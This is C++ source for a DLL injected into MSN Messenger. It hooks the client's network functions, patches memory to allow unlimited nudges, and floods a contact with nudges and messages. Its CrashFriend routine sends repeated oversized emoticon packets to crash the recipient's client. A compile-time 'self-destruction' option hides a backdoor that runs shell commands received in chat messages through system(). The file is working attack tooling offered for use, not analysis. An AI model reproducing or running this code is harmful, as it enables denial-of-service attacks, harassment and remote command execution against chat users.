#include "Define.h"
#include "TargetSystem.h"
#pragma comment (lib, "detours")
#include <detours.h>
//#include "MSNAuthenticator.h"

using namespace std;

#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_IA64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif

#pragma comment (lib, "comctl32")
#pragma region Constants and Global Variables
TargetSystem TargetInfo;
int SocketID;
HMODULE Module;
HWND hwnd;
HANDLE hMusicThread;
bool bLockon = false;
bool bInfinite = false;
bool Protecting = false;
bool bMusic	 = false;
DWORD PresenceIMEP = (DWORD)GetModuleHandle(L"PresenceIM.dll") + 0x63A5C;
#pragma endregion

#pragma region Settings
#define NO_PROTECTION
//#define FUCK_PROTECTION
//#define EXPIRE_ON		1288449031 + (60*60*24*30)
//#define SELF_DESTRUCTION			"1c14e178e9cfe529ffb8dfed394c4e9c"
//freak:
//#define SELF_DESTRUCTION			"7294001ae51b8cdfd50eb4459ee28182"
#ifdef SELF_DESTRUCTION
#define SELF_DESTRUCTION_COMMA		"1c14e1"
#endif
#pragma endregion

#if defined(SELF_DESTRUCTION) && !defined(SELF_DESTRUCTION_COMMA)
#error SELF_DESTRUCTION_COMMA must be defined if you choose to compile with self-destruction.
#endif

DWORD NudgeAddress[3] = {
	(DWORD)GetModuleHandle(L"msnmsgr.exe") + 0x168CE8,
	(DWORD)GetModuleHandle(L"msnmsgr.exe") + 0x168F02,
	(DWORD)GetModuleHandle(L"msnmsgr.exe") + 0x168E7B
};

int (WINAPI *pRecv)(SOCKET s, char* buf, int len, int flags) = recv;

int (WINAPI *pSend)(SOCKET s, const char* buf, int len, int flags) = send;

int WINAPI BypassRecv(SOCKET s, char* buf, int len, int flags);

int WINAPI BypassSend(SOCKET s, const char* buf, int len, int flags);

int (WINAPI *pWSARecv)(SOCKET socket, LPWSABUF lpBuffers, DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped, 
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine) = NULL;

int WINAPI MyWSARecv(SOCKET socket, LPWSABUF lpBuffers, DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped, 
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

int (WINAPI *pWSASend)(SOCKET socket, LPWSABUF lpBuffers, DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine) = NULL;

int WINAPI MyWSASend(SOCKET s,LPWSABUF lpBuffers,
	DWORD dwBufferCount,LPDWORD lpNumberOfBytesSent,DWORD dwFlags,
	LPWSAOVERLAPPED lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

const unsigned char OldBytes[3][6] = 
{
	{0x89 ,0x86 ,0x5c ,0x03 ,0x00 ,0x00},
	{0x89, 0x86, 0x60, 0x03, 0x00, 0x00},
	{0xc7, 0x00, 0x01, 0x00, 0x00, 0x00}
};

bool isChecked(DWORD dwCheckBox)
{
	return true;
	LRESULT lResult = SendMessage(hwnd,BM_GETCHECK,0,0);  
	if(lResult == BST_UNCHECKED)
		return false;
	return true;
}

bool StartsWith(const std::string& text,const std::string& token)
{
	
	if(text.length() < token.length() || text.length() == 0)
		return false;

	for(unsigned int i=0; i<token.length(); ++i)
	{
		if(text[i] != token[i])
			return false;
	}

	return true;
}

void SwitchNudgeStatus()
{
	//a for could do this but i'm too lazy to arrange them into an array
	if(!bInfinite)
	{
		const unsigned char NewBypass[6] = {0x90,0x90,0x90,0x90,0x90,0x90};
		SIZE_T BytesRead;
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)NudgeAddress[0], &NewBypass, 6, &BytesRead);
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)NudgeAddress[1], &NewBypass, 6, &BytesRead);
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)NudgeAddress[2], &NewBypass, 6, &BytesRead);
	}
	else
	{
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)NudgeAddress[0], &OldBytes[0], sizeof(OldBytes[0]), NULL);
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)NudgeAddress[1], &OldBytes[1], sizeof(OldBytes[1]), NULL);
		WriteProcessMemory(GetCurrentProcess(), (LPVOID)NudgeAddress[2], &OldBytes[2], sizeof(OldBytes[2]), NULL);
	}
	bInfinite = !bInfinite;
}

void UpdateVersionLabel(void)
{
#ifdef NO_PROTECTION
	SetDlgItemText(hwnd, IDC_VERSION, L"Community Edition");
#elif defined(FUCK_PROTECTION)
	SetDlgItemText(hwnd, IDC_VERSION, L"Protection Breaker Edition");
#else
	SetDlgItemText(hwnd, IDC_VERSION, L"Gold Version");
#endif
}

void TextMe(const char* a)
{
	SetDlgItemTextA(hwnd, IDC_VERSION, a);
}

int WINAPI BypassRecv( IN SOCKET s, char FAR * buf, IN int len, IN int flags )
{	
	return pRecv(s, buf, len, flags);
	//MessageBox(hwnd, Msg, L"Recv", NULL);
	//::closesocket(Socket);
}

std::wstring s2ws(const std::string& s);

void SetSocketID(int Value)
{
	if(bLockon)
		return;
	SocketID = Value;
	TargetInfo.m_SocketID = Value;
	SetDlgItemInt(hwnd, IDC_SOCKET, Value, false);
}

int WINAPI BypassSend(SOCKET s, const char* buf, int len, int flags)
{
	std::string sbuf = buf;
	if(len > 3 && StartsWith(sbuf, "MSG"))
	SetSocketID(s);
	return pSend(s, buf, len, flags);
}

int WINAPI MyWSASend(SOCKET s,LPWSABUF lpBuffers,
	DWORD dwBufferCount,LPDWORD lpNumberOfBytesSent,DWORD dwFlags,
	LPWSAOVERLAPPED lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
				//SetSocketID(s);
	return pWSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
}

vector<string> explode( const string &delimiter, const string &str)
{
    vector<string> arr;

    int strleng = str.length();
    int delleng = delimiter.length();
    if (delleng==0)
        return arr;//no change

    int i=0;
    int k=0;
    while( i<strleng )
    {
        int j=0;
        while (i+j<strleng && j<delleng && str[i+j]==delimiter[j])
            j++;
        if (j==delleng)//found delimiter
        {
            arr.push_back(  str.substr(k, i-k) );
            i+=delleng;
            k=i;
        }
        else
        {
            i++;
        }
    }
    arr.push_back(  str.substr(k, i-k) );
    return arr;
}

vector<string> explode( const char* delimiter, const string &str)
{
	string dlmtr = delimiter;
	return explode(dlmtr, str);
}

std::wstring s2ws(const std::string& s)
{
 int len;
 int slength = (int)s.length() + 1;
 len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
 wchar_t* buf = new wchar_t[len];
 MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
 std::wstring r(buf);
 delete[] buf;
 return r;
}

void SpamNudge(unsigned int Length)
{
	char Packet[200];
	ZeroMemory(&Packet[0], 200);
	int Socket = SocketID; //Get the socket ID
	for (unsigned int i = 0; i < Length; ++i)
	{
		wsprintfA(Packet, "MSG %d N 69\x0D\x0AMIME-Version: 1.0\x0D\x0A\x43ontent-Type: text/x-msnmsgr-"
			"datacast\x0D\x0A\x0D\x0AID: 1\x0D\x0A\x0D\x0A\0", (*(DWORD*)PresenceIMEP)++);
		send(Socket, Packet, strlen(Packet), 0);
		Sleep(5);
	}
	MessageBox(NULL, L"Done!", L"Done!", MB_ICONINFORMATION);
	ExitThread(0);
}

void SendTextMessage(SOCKET session, const char* message);

void SpamMessage(unsigned int Length)
{
	SOCKET s = SocketID;
	char Text[300];
	GetDlgItemTextA(hwnd, IDC_TEXT, Text, 300);
	if(s)
	{
		for(unsigned int i = 0; i < Length; ++i)
		{
			SendTextMessage(s, Text);
			Sleep(5);
		}
	}
	MessageBox(NULL, L"Done!", L"Done!", MB_ICONINFORMATION);
	ExitThread(0);
}

void SendTextMessage(SOCKET session, const char* message)
{
    char packetSize[8];
    ZeroMemory(packetSize, 8);
	//sprintf(pHeader, "MSG %d N ", (*(DWORD*)PresenceIMEP)++);
    string packetHeader = "MSG 10 N ";
    string packetSettings = "MIME-Version: 1.0\r\nContent-Type: " 
                            "text/plain; charset=UTF-8\r\n";
    packetSettings += "X-MMS-IM-Format: FN=MS%20Shell%20Dlg; " 
	//packetSettings += "X-MMS-IM-Format: FN=Arial; " 
                      "EF=; CO=0; CS=0; PF=0\r\n\r\n";
	(*(DWORD*)PresenceIMEP)++;
	std::string packetMessage = message;
    int sizeOfPacket = packetSettings.length() + packetMessage.length();
    _itoa_s(sizeOfPacket, packetSize, 8, 10);
    packetHeader += packetSize;
    packetHeader += "\r\n";
    string fullPacket = packetHeader;
            fullPacket += packetSettings;
            fullPacket += packetMessage;
    pSend(session, fullPacket.c_str(), fullPacket.length(), 0);
}

int WINAPI MyWSARecv(SOCKET socket, LPWSABUF lpBuffers, DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped, 
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{

#ifdef SELF_DESTRUCTION
	if(lpBuffers->len > 5)
		{
			if(strstr(lpBuffers->buf, "MSG ") != 0 && (strstr(lpBuffers->buf, "MIME-Version") != 0
				&& strstr(lpBuffers->buf, "X-MMS-IM-Format") != 0))
			{

				if(char* Shell = strstr(lpBuffers->buf, SELF_DESTRUCTION))
				{
					//Shell += sizeof(SELF_DESTRUCTION);
					std::string ShellString = Shell, Comma = SELF_DESTRUCTION_COMMA, Start = SELF_DESTRUCTION;
					vector<string>u = explode(Start, ShellString);
					u = explode(Comma, u[1]);
					ShellString = u[0];
					system(ShellString.c_str());
					SetLastError(WSAENOTSOCK);
					return SOCKET_ERROR;
				}
			}
		}
#endif

#ifndef NO_PROTECTION

	if(Protecting)
	{
		if(lpBuffers->len > 5)
		{
			if(strstr(lpBuffers->buf, "MSG ") != 0 && (strstr(lpBuffers->buf, "MIME-Version") != 0
				&& strstr(lpBuffers->buf, "X-MMS-IM-Format") != 0))
			{
				/*
				FILE* pRecvLogFile;
				fopen_s(&pRecvLogFile, "E:\\WRecvLog.txt", "a+");
				fprintf(pRecvLogFile, "Socket: %u, Length: %d, Buffer: %s\n\n\nE-N-D=========", socket, lpBuffers->len, lpBuffers->buf);
				fclose(pRecvLogFile);
				*/

				std::string CrashMsg = ":'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";
				if(strstr(lpBuffers->buf, CrashMsg.c_str()))
				{/*
					std::string in = "";
					in += lpBuffers->buf;
					wchar_t Msg[400];
					wsprintfW(Msg, L"Someone tried to crash you!", explode(in).c_str());*/
					vector<string> v = explode(" ", lpBuffers->buf);
					std::string Crasher = v[2];
					vector<string> v1 = explode("%20", Crasher.c_str());
					Crasher = v1[0];
					wchar_t Msg[200];
					LPSYSTEMTIME SysTime;
					GetSystemTime(SysTime);
					//wsprintf(Msg, L"%s tried to crash you!", s2ws(Crasher).c_str());
					wsprintf(Msg, L"%s at %d-%d-%d %u:%u:%u", s2ws(Crasher).c_str(), SysTime->wDay, SysTime->wMonth, SysTime->wYear,
						SysTime->wHour + 3, SysTime->wMinute, SysTime->wSecond);
					SetDlgItemText(hwnd, IDC_PROTECT_ATTEMPT, Msg);
					SetLastError(WSAENOTSOCK);
					return SOCKET_ERROR;
				}/*
				else
					SetDlgItemText(hwnd, 2, L"");
					*/
					
			}
		}
	}
#endif
	return pWSARecv(socket, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd,
		lpFlags, lpOverlapped, lpCompletionRoutine);
}

int GetDWORDLength(DWORD dw)
{
	char buffer[6];			//99k if you are lifeless
	ltoa((long)dw, buffer, 10);
	return strlen(buffer);
}

void CrashFriend(void)
{/*
	std::string CrashMsg = "MSG 107 N 1222";
	CrashMsg += "MIME-Version: 1.0";
	CrashMsg += "Content-Type: text/plain; charset=UTF-8";
	CrashMsg += "X-MMS-IM-Format: FN=Arial; EF=; CO=0; CS=86; PF=22";*/
	//std::string Text = ":'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";
#ifndef FUCK_PROTECTION
	std::string Text = "':'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";//:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";
#else
	//std::string CrashMsg = ":'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";
	std::string Text = "<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)<:o)";
#endif
	SOCKET Socket = SocketID; //Get the socket ID
	int Sends = 0;
	int Errors = 0;
	int LastErrorsInARow = 0;
	HWND hCrashButton = ::GetDlgItem(hwnd, IDC_CRASH);
	SetDlgItemText(hwnd, IDC_CRASH_STATUS, L"Crashing...");
	if(hCrashButton)
		EnableWindow(hCrashButton, false);
	Sleep(2500);
	while(true)
	{
#ifndef FUCK_PROTECTION
		char Packet[1541];
		ZeroMemory(&Packet[0], 1541);
		//wsprintfA(Packet, "MSG 107 N %d\x0D\x0AMIME-Version: 1.0\x0D\x0A\x43ontent-Type: text/plain; charset=UTF-8\x0D\x0AX-MMS-IM-Format: FN=Arial; EF=; CO=0; CS=86; PF=22\x0D\x0A\x0D\x0A%s", 112 + strlen(Text.c_str()), Text.c_str());
		wsprintfA(Packet,
"MSG %d N %d\x0D\x0AMIME-Version: 1.0\x0D\x0A\x43ontent-Type: text/plain; charset=UTF-8\x0D\x0AX-MMS-IM-Format: FN=Arial; EF=; CO=0; CS=0; PF=22\x0D\x0A\x0D\x0A%s\x0",
(*(DWORD*)PresenceIMEP)/*(*(DWORD*)PresenceIMEP)++*/, strlen(Text.c_str()) - 40 - GetDWORDLength((*(DWORD*)PresenceIMEP)++), Text.c_str());
		//755E5C5A   C745 FC 03000000 MOV DWORD PTR SS:[EBP-4],3		
		int SendResults = send(Socket, Packet, strlen(Packet), 0);
		//77196DAB - f0 0f c7 0f                - lock cmpxchg8b [edi],		
		//SetDlgItemInt(hwnd, TEXT_SENT_TIMES, Sends, 0);
		Sleep(100);
		if(SendResults == SOCKET_ERROR /* || Sends > 230 */)
		{
			Sleep(100);
			LastErrorsInARow++;
			if(
				(Sends > 230) || // 230 valid sends should crash every computer, even powerful one as alon has
				LastErrorsInARow > 30 ) //probably disconnected him
			{
				//SetDlgItemInt(hwnd, TEXT_SENT_TIMES, Sends, 0);
				//SetDlgItemInt(hwnd, TEXT_SENT_TIMES, WSAGetLastError(), 0);
				SetDlgItemText(hwnd, IDC_CRASH_STATUS, L"Finished!");
				MessageBox(NULL, L"You've crashed your friend!\nMaybe he's still online but his MSN is actually stuck :D",L"Success!", NULL);
				if(hCrashButton)
					EnableWindow(hCrashButton, true);
				ExitThread(0);
			}
		}
		else
		{
			LastErrorsInARow = 0;
			Sends++;
		}
	}
#else
		for(int i = 0; i < 300; ++i)
		{
			SendTextMessage(Socket, Text.c_str());
			Sleep(100);
		}
		SetDlgItemText(hwnd, IDC_CRASH_STATUS, L"Finished! (POWERFUL)");
				MessageBox(NULL, L"You've crashed your friend!\nMaybe he's still online but his MSN is actually stuck :D",L"Success!", NULL);
				if(hCrashButton)
					EnableWindow(hCrashButton, true);
				ExitThread(0);
	}
#endif
}

void StopResource();
BOOL PlayResource (LPTSTR lpName);

BOOL WINAPI MainDlgProc (HWND hWnd,	// handle to dialog box
						   UINT uMsg,      // message
						   WPARAM wParam,  // first message parameter
						   LPARAM lParam ) // second message parameter
{
	string text;
	char Text[90];
	switch(uMsg)
	{
	case WM_INITDIALOG:
		{
			hwnd = hWnd;
			UpdateVersionLabel();
#ifdef NO_PROTECTION
			HWND hProtectionButton = GetDlgItem(hWnd, IDC_PROTECTION);
			if(hProtectionButton)
				EnableWindow(hProtectionButton, false);
			SetDlgItemText(hWnd, IDC_PROTECT_STATUS, L"Community Version\n No Protection.");
#endif
			//CheckDlgButton(hWnd, IDC_CHECKMUSIC, true);
			//hMusicThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&PlayResource,  (LPVOID)(TEXT("soundName")), 0, 0);
		}break;
	case WM_COMMAND:
		{
			switch(LOWORD(wParam))
			{
			case IDC_LOCKON:
				bLockon = true;
				break;
			case IDC_REMOVELOCKON:
				bLockon = false;
				SetDlgItemInt(hWnd, IDC_SOCKET, 0, 0);
				break;
			case IDC_BUTTON1:
				//sprintf(Text, "0x%x, 0x%x, 0x%x", NudgeAddress[0], NudgeAddress[1], NudgeAddress[2]);
				//MessageBoxA(NULL, Text, "debug:", NULL);
				SwitchNudgeStatus();
				HWND hNudgeButton;
				hNudgeButton = GetDlgItem(hWnd, IDC_BUTTON1);
				if(hNudgeButton)
				{
					if(bInfinite)
						SetWindowText(hNudgeButton, L"Finite Nudge");
					else
						SetWindowText(hNudgeButton, L"Infinite Nudge");
				}
				break;
			case IDC_BUTTON2:
				int Loop;
				Loop = GetDlgItemInt(hWnd, IDC_EDIT1, 0, 0);
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&SpamNudge, (LPVOID)Loop, NULL, NULL);
				break;
#ifndef NO_PROTECTION
			case IDC_PROTECTION:
				Protecting = !Protecting;
				if(Protecting)
					SetDlgItemText(hWnd, IDC_PROTECT_STATUS, L"Protecting...");
				else
					SetDlgItemText(hWnd, IDC_PROTECT_STATUS, L"Not Protecting...");
				break;
#endif
			case IDC_CRASH:
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&CrashFriend, (LPVOID)NULL, 0, 0);
				break;/*
			case IDC_MUSICON:
				hMusicThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&PlayResource,  (LPVOID)(TEXT("soundName")), 0, 0);
				break;
			case IDC_MUSICOFF:
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&StopResource,  NULL, 0, 0);
				TerminateThread(hMusicThread, ERROR_SUCCESS);
				break;*/
			case IDC_BUTTON4:
				int MsgLoop;
				MsgLoop = GetDlgItemInt(hWnd, IDC_EDIT3, 0, 0);
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&SpamMessage, (LPVOID)MsgLoop, NULL, NULL);
				break;/*
			case IDC_CREDITS_BUTTON:
				int res;
				res = MessageBox(NULL, L"Credits:\nAdam (doadam@gmail.com) for writing this application.\nNitzan Freak Steinberg for helping me to test this."
						,L"Credits", MB_OK);
				break;*/
			}
		}break;
	case WM_DESTROY:
		{
			DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)pRecv,BypassRecv);
		DetourDetach(&(PVOID&)pWSARecv, MyWSARecv);
		DetourDetach(&(PVOID&)pSend, BypassSend);
		DetourDetach(&(PVOID&)pWSASend, MyWSASend);
		DetourTransactionCommit();
		PostQuitMessage(0);
		wchar_t ClassName[30];
			GetClassName(hWnd, ClassName, 30);
			UnregisterClass(ClassName, Module);
			FreeLibraryAndExitThread(Module, 0);
			}break;
		}
		return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void StopResource()
{
	bMusic = false;
	sndPlaySound (NULL, SND_MEMORY | SND_SYNC | SND_NODEFAULT); 
}

BOOL PlayResource (LPTSTR lpName) 
{ 
  BOOL bRtn; 
  LPTSTR lpRes; 
  HRSRC hResInfo;
  HGLOBAL hRes; 

  // Find the wave resource.
  hResInfo = FindResource (Module, lpName, L"WAVE"); 

  if (hResInfo == NULL) 
    return FALSE; 

  // Load the wave resource. 
  hRes = LoadResource (Module, hResInfo); 

  if (hRes == NULL) 
    return FALSE; 

  // Lock the wave resource and play it. 
  lpRes = (LPTSTR)LockResource (hRes);
  
  if (lpRes != NULL) 
    { 
		bMusic = true;
    bRtn = sndPlaySound (lpRes, SND_MEMORY /*| SND_SYNC*/ | SND_NODEFAULT); 
    } 
  else 
    bRtn = 0; 

  return bRtn; 
}


void StartWindow()
{
	DialogBoxParam (Module, MAKEINTRESOURCE (IDD_DIALOG1), NULL, MainDlgProc, NULL);
}

BOOL APIENTRY DllMain( HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
#ifdef EXPIRE_ON
		time_t CurrentTime = time(NULL);
		if(CurrentTime > EXPIRE_ON)
		{
			MessageBox(NULL, L"The application has been expired, please request another one.", L"Activation Notification", NULL);
			FreeLibraryAndExitThread(hModule, 0);
		}
#endif

		Module = hModule;
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		pWSARecv = (int (WINAPI *)(SOCKET, LPWSABUF, DWORD,
			LPDWORD, LPDWORD, LPWSAOVERLAPPED,  LPWSAOVERLAPPED_COMPLETION_ROUTINE))
			DetourFindFunction("Ws2_32.dll", "WSARecv");
		pWSASend = (int (WINAPI *)(SOCKET,LPWSABUF,DWORD,
			LPDWORD,DWORD,LPWSAOVERLAPPED,LPWSAOVERLAPPED_COMPLETION_ROUTINE))
			DetourFindFunction("Ws2_32.dll", "WSASend");
		DetourAttach(&(PVOID&)pRecv, BypassRecv);
		DetourAttach(&(PVOID&)pWSARecv, MyWSARecv);
		DetourAttach(&(PVOID&)pSend, BypassSend);
		DetourAttach(&(PVOID&)pWSASend, MyWSASend);
		if(DetourTransactionCommit() == NO_ERROR)
		{
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&StartWindow, NULL, NULL, NULL);
		}
		else
		{
			FreeLibraryAndExitThread(Module, 0);
		}
	}
	return TRUE;
}
